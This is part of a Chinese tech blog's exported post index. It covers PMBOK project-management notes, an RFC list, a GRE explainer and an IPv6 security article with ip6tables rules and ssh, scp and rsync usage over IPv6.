<td></td>
</tr>
<tr>
<td>沟通管理计划</td>
<td></td>
</tr>
<tr>
<td>风险管理计划</td>
<td></td>
</tr>
<tr>
<td>采购管理计划</td>
<td></td>
</tr>
<tr>
<td>项目相关方管理计划</td>
<td></td>
</tr>
<tr>
<td>项目基准</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>经验教训登记册<br>形成时间、经验教训描述、形成原因、造成影响、解决办法</li>
</ul>
<h4 id="监控项目工作"><a href="#监控项目工作" class="headerlink" title="监控项目工作"></a>监控项目工作</h4><p><strong>Focus on Whom</strong></p>
<ul>
<li>实际绩效：对比项目管理计划；评估是否需要纠正、预防措施</li>
<li>风险：识别、分析、跟踪和监测已有风险</li>
<li>信息库：文档</li>
<li>绩效报告：状态报告、进展测量和预测</li>
<li>监督变更实施情况</li>
</ul>
<p><strong>监控分析技术</strong></p>
<ul>
<li>回归分析：根本原因分析</li>
<li>分组方法：预测方法（如时间序列、情景构建、模拟等）</li>
<li><strong>因果分析</strong></li>
<li>失效模式与影响分析（FMEA）</li>
<li>故障树分析（FTA）</li>
<li>储备分析</li>
<li>趋势分析</li>
<li>挣值管理</li>
<li>差异分析</li>
</ul>
<h4 id="实施整体变更控制"><a href="#实施整体变更控制" class="headerlink" title="实施整体变更控制"></a>实施整体变更控制</h4><p><strong>Never change is change</strong></p>
<p>永远不变的就是变化：</p>
<ul>
<li>合理接受变更</li>
<li>严谨管理变更</li>
</ul>
<h2 id="项目范围管理-Project-Scope-Management"><a href="#项目范围管理-Project-Scope-Management" class="headerlink" title="项目范围管理 | Project Scope Management"></a>项目范围管理 | Project Scope Management</h2><h2 id="项目进度管理-Project-Schedule-Management"><a href="#项目进度管理-Project-Schedule-Management" class="headerlink" title="项目进度管理 | Project Schedule Management"></a>项目进度管理 | Project Schedule Management</h2><h2 id="项目成本管理-Project-Cost-Management"><a href="#项目成本管理-Project-Cost-Management" class="headerlink" title="项目成本管理 | Project Cost Management"></a>项目成本管理 | Project Cost Management</h2><h2 id="项目质量管理-Project-Quality-Management"><a href="#项目质量管理-Project-Quality-Management" class="headerlink" title="项目质量管理 | Project Quality Management"></a>项目质量管理 | Project Quality Management</h2><h2 id="项目资源管理-Project-Resource-Management"><a href="#项目资源管理-Project-Resource-Management" class="headerlink" title="项目资源管理 | Project Resource Management"></a>项目资源管理 | Project Resource Management</h2><h2 id="项目沟通管理-Project-Communications-Management"><a href="#项目沟通管理-Project-Communications-Management" class="headerlink" title="项目沟通管理 | Project Communications Management"></a>项目沟通管理 | Project Communications Management</h2><h2 id="项目风险管理-Project-Risk-Management"><a href="#项目风险管理-Project-Risk-Management" class="headerlink" title="项目风险管理 | Project Risk Management"></a>项目风险管理 | Project Risk Management</h2><h2 id="项目采购管理-Project-Procurement-Management"><a href="#项目采购管理-Project-Procurement-Management" class="headerlink" title="项目采购管理 | Project Procurement Management"></a>项目采购管理 | Project Procurement Management</h2><h2 id="项目相关方管理-Project-Stakeholder-Management"><a href="#项目相关方管理-Project-Stakeholder-Management" class="headerlink" title="项目相关方管理 | Project Stakeholder Management"></a>项目相关方管理 | Project Stakeholder Management</h2><h2 id="工具与技术"><a href="#工具与技术" class="headerlink" title="工具与技术"></a>工具与技术</h2><h4 id="垂直图表法"><a href="#垂直图表法" class="headerlink" title="垂直图表法"></a>垂直图表法</h4><h2 id="阅读作业"><a href="#阅读作业" class="headerlink" title="阅读作业"></a>阅读作业</h2><ul>
<li>《PMBOK 项目管理知识体系指南》</li>
</ul>
<h4 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h4><ul>
<li><a href="https://riboseyim.com/2019/02/06/Project/">项目管理 | Overview of Project Management</a></li>
<li><a href="https://riboseyim.com/2019/04/30/Project-PMP/">PM指南:PMI项目管理知识体系</a></li>
<li><a href="https://riboseyim.com/2019/03/27/Project-Construction/">PM指南:建筑工程项目管理|行业案例教学</a></li>
<li><a href="#">PM指南:范围管理</a></li>
<li><a href="#">PM指南:进度管理</a></li>
<li><a href="#">PM指南:成本管理</a></li>
<li><a href="#">PM指南:质量管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Resources/">PM指南:资源管理</a></li>
<li><a href="https://riboseyim.com/2019/02/06/Project-Communications/">PM指南:沟通管理</a></li>
<li><a href="https://riboseyim.github.io/2018/06/05/Project-Risk/">PM指南:风险管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Procurement/">PM指南:采购管理</a></li>
<li><a href="#">PM指南:相关方管理</a></li>
<li><a href="https://riboseyim.com/2019/05/29/Project-Tech-NetworkPlanning/">PM指南:网络计划技术|工具与技术</a></li>
<li><a href="https://riboseyim.com/2019/04/06/Project-PMIS/">PM指南:项目管理信息系统|工具与技术</a></li>
<li><a href="https://riboseyim.com/2018/06/19/Project-Template/">PM指南:项目管理开局模板|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/04/26/TeamWork-Redmine/">PM指南:开源项目管理平台Redmine|工具与技术</a></li>
<li><a href="https://riboseyim.com/2017/08/06/TeamWork-Kanban/">PM指南:软件业看板Kanban管理实践|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/05/31/TeamWork-Git/">PM指南:源代码版本管理|工具与技术</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>Manager</tag>
        <tag>工具癖</tag>
      </tags>
  </entry>
  <entry>
    <title>Protocol-IPAddr</title>
    <url>/2019/05/03/Protocol-IPAddr/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><h4 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h4><h4 id="Overview-Current-Solutions"><a href="#Overview-Current-Solutions" class="headerlink" title="Overview Current Solutions"></a>Overview Current Solutions</h4><ul>
<li>solution 1. 利/弊</li>
<li>solution 2. 利/弊</li>
<li>solution 3. 利/弊</li>
</ul>
<h2 id="Introduction-XXXX-Solution-New"><a href="#Introduction-XXXX-Solution-New" class="headerlink" title="Introduction XXXX Solution (New)"></a>Introduction XXXX Solution (New)</h2><h4 id="Overview-of-XXXX-Theory"><a href="#Overview-of-XXXX-Theory" class="headerlink" title="Overview of XXXX Theory"></a>Overview of XXXX Theory</h4><h5 id="Concept-A-核心概念"><a href="#Concept-A-核心概念" class="headerlink" title="Concept A | 核心概念"></a>Concept A | 核心概念</h5><h5 id="Concept-B-核心概念"><a href="#Concept-B-核心概念" class="headerlink" title="Concept B | 核心概念"></a>Concept B | 核心概念</h5><h5 id="Concept-C-核心概念"><a href="#Concept-C-核心概念" class="headerlink" title="Concept C | 核心概念"></a>Concept C | 核心概念</h5><h2 id="Overview-of-XXXX-Practice-（最佳实践）"><a href="#Overview-of-XXXX-Practice-（最佳实践）" class="headerlink" title="Overview of XXXX Practice （最佳实践）"></a>Overview of XXXX Practice （最佳实践）</h2><h2 id="Future：Beyond-the-XXX"><a href="#Future：Beyond-the-XXX" class="headerlink" title="Future：Beyond the XXX"></a>Future：Beyond the XXX</h2><h2 id="阅读作业"><a href="#阅读作业" class="headerlink" title="阅读作业"></a>阅读作业</h2><h2 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://github.com/c-robinson/iplib" target="_blank" rel="noopener">A library for working with IP addresses and networks in Go</a></li>
<li><a href="https://www.tecmint.com/ip-address-management-tools-for-linux/" target="_blank" rel="noopener">Best IP Address Management Tools for Linux</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
  </entry>
  <entry>
    <title>Protocol-RADIUS</title>
    <url>/2019/03/08/Protocol-RADIUS/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>Protocol-Route-OSPF</title>
    <url>/2019/04/30/Protocol-Route-OSPF/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.cisco.com/c/zh_cn/support/docs/ip/ipv6-routing/200187-Understand-OSPFv3-AS-External-LSA-Route.html" target="_blank" rel="noopener"></a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>计算机 RFC 文档</title>
    <url>/2017/05/12/Protocol-RFC/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>互联网研究任务组（Internet Research Task Force,IRTF）</li>
<li>互联网工程任务组（Internet Engineering Task Force，IETF）</li>
</ul>
<a id="more"></a>
<p>在建立ARPNET时，美国国防部成立了一个非正式委员会来监督它的运行。1983年，该委员会更名为 <strong>Internet活动委员会（IAB，Internet Activities Board）</strong>，后来缩写词改为 <strong>Internet 体系结构委员会（Internet Architecture Board）</strong>。</p>
<p>1989年，IAB 被重新改组，研究人员被重组到IRTF更加专注于长期研究，IETF处理短期的工程事项：</p>
<ul>
<li>互联网研究任务组（Internet Research Task Force,IRTF）</li>
<li>互联网工程任务组（Internet Engineering Task Force，IETF）</li>
</ul>
<h4 id="IETF-主要任务"><a href="#IETF-主要任务" class="headerlink" title="IETF 主要任务"></a>IETF 主要任务</h4><p>负责互联网相关技术规范的研发和制定</p>
<h5 id="IETF-体系结构"><a href="#IETF-体系结构" class="headerlink" title="IETF 体系结构"></a>IETF 体系结构</h5><ul>
<li>互联网架构委员会（IAB）</li>
<li>互联网工程指导委员会（IESG）</li>
<li>工作组（八个领域：Internet路由，传输，应用领域等）</li>
</ul>
<h4 id="IETF文件类别"><a href="#IETF文件类别" class="headerlink" title="IETF文件类别"></a>IETF文件类别</h4><ul>
<li>草案（Internet Draft): 没有特殊限制，进行标准化工作的起点。</li>
<li>RFC（Request For Comments）: 正式的可以永久存档的标准文件，按顺序推出，批准出台后不做更改。</li>
</ul>
<h2 id="List"><a href="#List" class="headerlink" title="List"></a>List</h2><ul>
<li><p><a href="https://tools.ietf.org/html/rfc1035" target="_blank" rel="noopener">RFC1035 DOMAIN NAMES - IMPLEMENTATION AND SPECIFICATION</a></p>
</li>
<li><p><a href="https://tools.ietf.org/html/rfc1492" target="_blank" rel="noopener">RFC1492: An Access Control Protocol, Sometimes Called TACACS</a></p>
</li>
<li><p><a href="https://tools.ietf.org/html/rfc5424" target="_blank" rel="noopener">RFC5424:About Syslog</a></p>
</li>
<li><p><a href="http://www.rfcreader.com/#rfc6749" target="_blank" rel="noopener">RFC6749:OAuth 2.0，OAuth2 is an authentication framework</a></p>
</li>
<li><p><a href="https://tools.ietf.org/html/rfc7519" target="_blank" rel="noopener">RFC7519:JSON web tokens,JWT is an authentication protocol</a></p>
</li>
<li><p>Internet Control Messages Protocol (ICMP)  RFC 792</p>
</li>
<li>Internet Group Management Protocol (IGMP)  RFC 3376</li>
<li>Transmission Control Protocol (TCP)  RFC 793</li>
<li>Exterior Gateway Protocol  RFC 888</li>
<li>User Datagram Protocol (UDP)  RFC 768</li>
<li>IPv6 Routing Header RFC 1883</li>
<li>IPv6 Fragment Header RFC 1883</li>
<li><p>ICMP for IPv6 RFC 1883</p>
</li>
<li><p><a href="https://tools.ietf.org/html/rfc1191" target="_blank" rel="noopener">RFC1191: Path MTU Discovery</a></p>
</li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络协议：IPv6 与网络安全</title>
    <url>/2017/08/09/Protocol-IPv6/</url>
    <content><![CDATA[<h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><ul>
<li>IPv6 Overview</li>
<li>IPv6 &amp; Cyber-Security:IPsec,TLS/SSL, NAT,Source routing</li>
<li>IPv6 &amp; Linux Security:iptables vs ip6tables,SSH/SCP/Rsync</li>
</ul>
<span id="more"></span>
<h2 id="IPv6"><a href="#IPv6" class="headerlink" title="IPv6"></a>IPv6</h2><p>IPv6(Internet Protocol version 6)是互联网协议的最新版本，用于分组交换互联网络的网络层协议，旨在解决IPv4地址枯竭问题。IPv6二进位制下为128位长度，以16位为一组，每组以冒号“:”隔开，可以分为8组，每组以4位十六进制方式表示。例如：2001:0db8:85a3:08d3:1319:8a2e:0370:7344 是一个合法的IPv6地址。</p>
<p><img src="https://www.linux.com/sites/lcom/files/styles/rendered_file/public/ip-address-allocation.png?itok=ajvQlGr-" alt="Allocation of IPv4 address space: the United States uses more than a third of the available IPv4 addresses."></p>
<h4 id="IPv6-报文包格式"><a href="#IPv6-报文包格式" class="headerlink" title="IPv6 报文包格式"></a>IPv6 报文包格式</h4><p>定义：<a href="https://tools.ietf.org/html/rfc1883">RFC 1883</a>中定义的原始版本，<a href="https://tools.ietf.org/html/rfc2460">RFC 2460</a>中描述的现在提议的标准版本。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Network_IPv6_Packet.png" alt=""></p>
<h4 id="IPv6地址分类"><a href="#IPv6地址分类" class="headerlink" title="IPv6地址分类"></a>IPv6地址分类</h4><ul>
<li>单播地址（unicast）：单播地址标示一个网络接口，协议会把送往地址的数据包送往给其接口。单播地址包括可聚类的全球单播地址、链路本地地址等。</li>
<li>多播地址（multicast）：多播地址也称组播地址。多播地址也被指定到一群不同的接口，送到多播地址的数据包会被发送到所有的地址。</li>
<li>任播地址（anycast）：Anycast 是 <strong>IPv6 特有的数据发送方式</strong>，它像是IPv4的Unicast（单点传播）与Broadcast（多点广播）的综合。</li>
</ul>
<p>Anycast 像 IPv4 多点广播（Broadcast）一样，会有一组接收节点的地址栏表，但指定为Anycast的数据包，只会发送给距离最近或发送成本最低（根据路由表来判断）的其中一个接收地址，当该接收地址收到数据包并进行回应，且加入后续的传输。该接收列表的其他节点，会知道某个节点地址已经回应了，它们就不再加入后续的传输作业。以目前的应用为例，Anycast地址只能分配给路由器，不能分配给电脑使用，而且不能作为发送端的地址。</p>
<h2 id="IPv6-amp-Cyber-Security"><a href="#IPv6-amp-Cyber-Security" class="headerlink" title="IPv6 &amp; Cyber-Security"></a>IPv6 &amp; Cyber-Security</h2><p>对我们网络的攻击来自各种各样的来源：社会工程（Social Engineering）、粗心、垃圾邮件、网络钓鱼、操作系统漏洞、应用程序漏洞、广告网络、跟踪和数据收集、服务提供商窥探等。作为一个新兴的网络协议，安全问题同样无法避免。</p>
<h4 id="IPsec-TLS-SSL-SSH"><a href="#IPsec-TLS-SSL-SSH" class="headerlink" title="IPsec/TLS/SSL/SSH"></a>IPsec/TLS/SSL/SSH</h4><p>IPsec（网际网络安全协议，Internet Protocol Security，<a href="https://tools.ietf.org/html/rfc4301">RFC 4301</a>、<a href="https://tools.ietf.org/html/rfc4309">RFC 4309</a> ），旨在在网络层为IP分组提供安全服务，包括访问控制、数据完整性、身份验证、防止重放和数据机密性。IPsec原本是为IPv6开发，但是在IPv4中已被大量部署。最初，IPsec是IPv6协议组中不可少的一部分，但现在是可选的。</p>
<p>在传输模式下，IPsec在IP报头和高层协议之间插入一个报头，IP报头与原始IP报头相同，只是IP协议字段被改为ESP或者AH，并重新计算IP报头的校验和。IPsec假定IP端点是可达的，源端头不会修改IP报头中的目标IP地址。IPsec 工作在网络层。其它加密协议如 TLS/SSL 和 SSH，工作在传输层之上，是针对具体应用的。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Network_Procotol_Security.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Network_IPsec_PacketHeader.png" alt=""></p>
<h4 id="NAT-Security"><a href="#NAT-Security" class="headerlink" title="NAT = Security ?"></a>NAT = Security ?</h4><blockquote>
<p>NAT is not and never has been about security.</p>
</blockquote>
<p>NAT(Network Address Translation) 是一种在IP数据包通过路由器或防火墙时重写来源IP地址或目的IP地址的技术.NAT 延长了 IPv4的寿命。它的本意是通过地址伪装，阻止外部网络主机的恶意活动，阻止网络蠕虫病毒来提高本地系统的可靠性，阻挡恶意浏览来提高本地系统的私密性。另外，它也为UDP的跨局域网的传输提供了方便。很多防火墙都NAT功能，它使防火墙变成有状态的，检查所有的流量、跟踪哪些数据包进入您的内部主机，并将多个私有内部地址重写到一个外部地址。它在外部网关上创建一个单点故障源，并为拒绝服务（DoS）攻击提供了一个简单的目标。NAT有它的优点，但安全不是其中之一。</p>
<h4 id="Source-routing"><a href="#Source-routing" class="headerlink" title="Source routing"></a>Source routing</h4><p>Source routing 允许发送方控制转发，而不是将其留给任何一个包通过的路由器，通常是OSPF（Open Shortest Path First，开放最短路径优先）。Source routing 有时用于负载平衡，和管理VPN（Virtual Private Network，虚拟专用网络），所以，Source routing 并不是 IPv6 带来的特性，但是提出了许多安全问题。你可以用它来探测网络，获取信息，绕过安全设备。路由报头0型（RH0）是使源路由的IPv6扩展报头，它一直受到抨击，因为它使一中非常聪明的DoS攻击被放大，在两个路由器之间的反弹包直到它们超载及带宽耗尽。</p>
<h4 id="大就是强-？"><a href="#大就是强-？" class="headerlink" title="大就是强 ？"></a>大就是强 ？</h4><p>有些人认为IPv6地址空间如此之大，为网络扫描提供了一种防御。这是一种错误的观念。我们确实有潜在的庞大地址资源可供应用，但是我们倾向于在可预见的范围组织我们的网络。硬件在变得廉价的和强大，云计算资源的快速发展在惠及企业的同时，也降低了攻击方的门槛和成本（黑客、黑产）。计算机网络的复杂性决定了挫败恶意网络扫描的困难很大，包括在IPv6网络中进行监测辨别哪些属于本地访问、哪些不是，IPv6 控制访问的问题在于，它的管理能力要求超过了其它任何协议。传统的防御工具和方法论都有待更新。</p>
<h2 id="IPv6-amp-Linux-Security"><a href="#IPv6-amp-Linux-Security" class="headerlink" title="IPv6 &amp; Linux Security"></a>IPv6 &amp; Linux Security</h2><h4 id="iptables-amp-ip6tables"><a href="#iptables-amp-ip6tables" class="headerlink" title="iptables &amp; ip6tables"></a>iptables &amp; ip6tables</h4><p>ip6tables命令和iptables一样，都是Linux中防火墙软件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">##Block All IPv6</span></span><br><span class="line">$ vi /etc/sysctl.conf:</span><br><span class="line">net.ipv6.conf.all.disable_ipv6 = 1</span><br><span class="line">net.ipv6.conf.default.disable_ipv6 = 1</span><br><span class="line"><span class="comment">##load your changes:</span></span><br><span class="line">$ sudo sysctl -p</span><br><span class="line">net.ipv6.conf.all.disable_ipv6 = 1</span><br><span class="line">net.ipv6.conf.default.disable_ipv6 = 1</span><br><span class="line"><span class="comment">##Test</span></span><br><span class="line">$ ping6 -c3 -I eth0 fe80::f07:3c7a:6d69:8d11</span><br><span class="line">3 packets transmitted, 0 received, 100% packet loss, /time 2999s</span><br><span class="line"><span class="comment">##Listing</span></span><br><span class="line">$ sudo ip6tables -L</span><br><span class="line"><span class="comment"># Flushing</span></span><br><span class="line">$ sudo ip6tables -F</span><br></pre></td></tr></table></figure>
<h4 id="Example-Rules"><a href="#Example-Rules" class="headerlink" title="Example Rules"></a>Example Rules</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ip6tables single-host firewall script</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define your command variables</span></span><br><span class="line">ipt6=/sbin/ip6tables</span><br><span class="line"><span class="comment"># Flush all rules and delete all chains</span></span><br><span class="line"><span class="comment"># for a clean startup</span></span><br><span class="line">$ ipt6 -F</span><br><span class="line">$ ipt6 -X</span><br><span class="line"><span class="comment"># Zero out all counters</span></span><br><span class="line">$ ipt6 -Z</span><br><span class="line"><span class="comment"># Default policies: deny all incoming</span></span><br><span class="line"><span class="comment"># Unrestricted outgoing</span></span><br><span class="line">$ ipt6 -P INPUT DROP</span><br><span class="line">$ ipt6 -P FORWARD DROP</span><br><span class="line">$ ipt6 -P OUTPUT ACCEPT</span><br><span class="line"><span class="comment"># Must allow loopback interface</span></span><br><span class="line">$ ipt6 -A INPUT -i lo -j ACCEPT</span><br><span class="line"><span class="comment"># Reject connection attempts not initiated from the host</span></span><br><span class="line">$ ipt6 -A INPUT -p tcp --syn -j DROP</span><br><span class="line"><span class="comment"># Allow return connections initiated from the host</span></span><br><span class="line">$ ipt6 -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT</span><br><span class="line"><span class="comment"># Accept all ICMP v6 packets</span></span><br><span class="line">$ ipt6 -A INPUT -p ipv6-icmp -j ACCEPT</span><br><span class="line"><span class="comment"># Optional rules to allow other LAN hosts access to services. Delete $ipt6 -A INPUT -p tcp --syn -j DROP</span></span><br><span class="line"><span class="comment"># Allow DHCPv6 from LAN only</span></span><br><span class="line">$ ipt6 -A INPUT -m state --state NEW -m udp -p udp -s fe80::/10 --dport 546 -j ACCEPT</span><br><span class="line"><span class="comment"># Allow connections from SSH clients</span></span><br><span class="line">$ ipt6 -A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT</span><br><span class="line"><span class="comment"># Allow HTTP and HTTPS traffic</span></span><br><span class="line">$ ipt6 -A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT</span><br><span class="line">$ ipt6 -A INPUT -m state --state NEW -m tcp -p tcp --dport 443 -j ACCEPT</span><br><span class="line"><span class="comment"># Allow access to SMTP, POP3, and IMAP</span></span><br><span class="line">$ ipt -A INPUT -m state --state NEW -p tcp -m multiport --dport 25,110,143 -j ACCEPT</span><br></pre></td></tr></table></figure>
<h4 id="SSH-and-SCP"><a href="#SSH-and-SCP" class="headerlink" title="SSH and SCP"></a>SSH and SCP</h4><p>我们熟悉的文件拷贝工具：SSH, SCP, 和 Rsync 都支持 IPv6，坏消息是他们的语法怪异。</p>
<p>所有 Linux 管理员都知道使用 SSH 和 SCP。 它们在 IPv6 网络中有一些怪异，特别是关于远程地址，一旦你弄明白这个问题就能像过去一样熟练使用 SSH 和 SCP 。默认情况下，sshd 守护进程同时监听 IPv4 和 IPv6 协议，你可以通过 netstat 查看：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo netstat -pant|grep sshd</span><br><span class="line">tcp   0  0 0.0.0.0:22  0.0.0.0:*  LISTEN   1228/sshd       </span><br><span class="line">tcp6  0  0 :::22       :::*       LISTEN   1228/sshd</span><br><span class="line"><span class="comment">## 通过 sshd_config 中的 AddressFamily 选项禁用任何一种协议。禁用 IPv6:</span></span><br><span class="line"><span class="comment">## 默认选项为 any ，只允许IPv6 inet6</span></span><br><span class="line">AddressFamily inet</span><br><span class="line"><span class="comment">## 在客户端方面，通过 IPv6 网络登陆和 IPv4一样登陆、运行命令行以及退出。</span></span><br><span class="line">$ ssh carla@2001:db8::2</span><br><span class="line">$ ssh carla@2001:db8::2 backup</span><br><span class="line"><span class="comment">## 您可以使用链路本地地址访问本地局域网上的主机。</span></span><br><span class="line"><span class="comment">## 这有一个无正式文档说明的怪癖，会让你抓狂，但现在你知道它是什么：你必须把你的网络接口名称与远程地址用符号 “%” 连接。</span></span><br><span class="line">$ ssh carla@fe80::ea9a:8fff:fe67:190d%eth0</span><br></pre></td></tr></table></figure></p>
<p>你也可以简化远程root登录。聪明的管理员禁用root登录ssh，所以你必须登录为一个普通用户，然后换为root用户登录。这不是那么费力，但我们可以用一个命令来完成这一切，系统将在倒数120分钟后停止！这个shutdown将持续打开直到完成运行，所以中途你能改变注意并且用寻常的方式取消shutdown，通过 Ctrl+c。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh -t  carla@2001:db8::2 <span class="string">&quot;sudo su - root -c &#x27;shutdown -h 120&#x27;&quot;</span></span><br><span class="line">carla@2001:db8::2 password:</span><br><span class="line">[sudo] password /<span class="keyword">for</span> carla:</span><br><span class="line">Broadcast message from carla@remote-server</span><br><span class="line"><span class="comment">## 技巧：强制使用 IPv4 或者 IPv6</span></span><br><span class="line">$ ssh -6 2001:db8::2</span><br></pre></td></tr></table></figure>
<p>SCP是怪异的。你必须在链路本地地址的后面使用符号“%”来指定网络接口，并且将地址用方括号括起来，并避开括号；如果使用全球单播地址则不需要指定网络接口，但是依然需要方括号。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ scp filename [fe80::ea9a:8fff:fe67:190d%eth0]:carla@fe80::ea9a:8fff:fe67:190d password:</span><br><span class="line">filename</span><br><span class="line"></span><br><span class="line">$ scp filename [2001:db8::2]:</span><br><span class="line">carla@2001:db8::2 password:</span><br><span class="line">filename</span><br><span class="line"></span><br><span class="line"><span class="comment">## 示例：登录到远程主机上的不同用户帐户，指定将文件复制到的远程目录，并更改文件名：</span></span><br><span class="line">scp filename userfoo@[fe80::ea9a:8fff:fe67:190d%eth0]:/home/userfoo/files/filename_2</span><br></pre></td></tr></table></figure></p>
<h4 id="Rsync"><a href="#Rsync" class="headerlink" title="Rsync"></a>Rsync</h4><p>rsync 要求使用各种标点符号封闭远程的 IPv6 地址。与以往一样，请记住源目录中的尾随斜杠，例如 /home/carla/files/ ，表示只复制目录的内容。省略尾随斜杠将复制目录及其内容。尾随斜线并不重要，关键是你的目标目录。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##全球单播地址不需要指定网络接口：</span><br><span class="line">$ rsync -av /home/carla/files/ &#x27;carla@[2001:db8::2]&#x27;:/home/carla/stuff</span><br><span class="line">carla@f2001:db8::2 password:</span><br><span class="line">sending incremental file list</span><br><span class="line">sent 100 bytes  received 12 bytes  13.18 bytes/sec</span><br><span class="line">total size is 6,704  speedup is 59.86</span><br><span class="line">##使用链路本地地址时必须包含网络接口。</span><br><span class="line">$ rsync -av /home/carla/files/ &#x27;carla@[fe80::ea9a:8fff:fe67:190d%eth0]&#x27;:/home/carla/stuff</span><br></pre></td></tr></table></figure></p>
<h2 id="Master-Carla-Schroder"><a href="#Master-Carla-Schroder" class="headerlink" title="Master: Carla Schroder"></a>Master: Carla Schroder</h2><p><a href="http://www.oreilly.com/pub/au/1909">Carla Schroder</a> is a self-taught Linux and Windows sysadmin who laid hands on her first computer around her 37th birthday. Her first PC was a Macintosh LC II. Next came an IBM clone—a 386SX running MS-DOS 5 and Windows 3.1 with a 14-inch color display—which was adequate for many pleasant hours of Doom play. Then around 1997 she discovered Red Hat 5.0 and had a whole new world to explore. She is the author of the Linux Cookbook for O’Reilly, and writes Linux how-tos for several computer publications.</p>
<ul>
<li>《Linux Cookbook》2004,$49.99</li>
<li>《Linux Networking Cookbook》2007,$44.99</li>
<li>《The Book of Audacity》2011,$34.95</li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MzEzMTY0MA==&amp;mid=200482916&amp;idx=1&amp;sn=c267b65f8f5647854cf2cacdaeb795e2&amp;scene=0#rd">徐建锋：新贵与遗老续：IPv6的生而不活与IPv4的死而不僵</a></li>
<li><a href="https://www.linux.com/learn/intro-to-linux/2017/7/building-ipv6-firewalls-ipv6-security-myths">Carla Schroder@Linux.com:Building IPv6 Firewalls: IPv6 Security Myths</a></li>
<li><a href="https://www.linux.com/learn/intro-to-linux/2017/7remote-sessions-over-ipv6-ssh-scp-and-rsync">Carla Schroder@Linux.com:Remote Sessions Over IPv6 with SSH, SCP, and Rsync</a></li>
<li><a href="https://www.linux.com/learn/intro-to-linux/2017/8/iptables-rules-ipv6">Carla Schroder@Linux.com:How to Write iptables Rules for IPv6</a></li>
<li><a href="https://www.linux.com/learn/intro-to-linux/2017/6/practical-networking-linux-admins-tcpip">Practical Networking for Linux Admins: TCP/IP</a></li>
<li><a href="https://www.linux.com/learn/intro-to-linux/2017/6/practical-networking-linux-admins-real-ipv6">Practical Networking for Linux Admins: Real IPv6</a></li>
<li><a href="https://www.linux.com/learn/intro-to-linux/2017/6/practical-networking-linux-admins-ipv6-and-ipv6-lan-addressing">Practical Networking for Linux Admins: IPv4 and IPv6 LAN Addressing</a></li>
<li><a href="https://www.linux.com/learn/intro-to-linux/2017/7/practical-networking-linux-admins-ipv6-routing">Practical Networking for Linux Admins: IPv6 Routing</a></li>
<li><a href="https://www.linkedin.com/pulse/cyber-security-tls-ssl-vs-ipsec-abdulrahman-alabsi">Cyber Security : TLS / SSL vs IPSec</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Cyber-Security</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title>Protocol-Route</title>
    <url>/2018/11/21/Protocol-Route/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="GRE"><a href="#GRE" class="headerlink" title="GRE"></a>GRE</h2><p>GRE（Generic Routing Encapsulation，通用路由封装）协议用来对某种协议（如IP、MPLS、以太网）的数据报文进行封装，使这些被封装的数据报文能够在另一个网络中传输。封装后的数据报文在网络中传输的路径，称为 GRE 隧道。GRE隧道是一个虚拟的点到点的连接，其两端的设备分别对数据报文进行封装及解封装。</p>
<p>GRE封装后的报文包括如下几个部分：</p>
<ul>
<li>载荷包（ Payload packet ）：需要封装和传输的数据报文。净荷数据的协议类型，称为乘客协议（Passenger Protocol）。乘客协议可以是任意的网络层协议。</li>
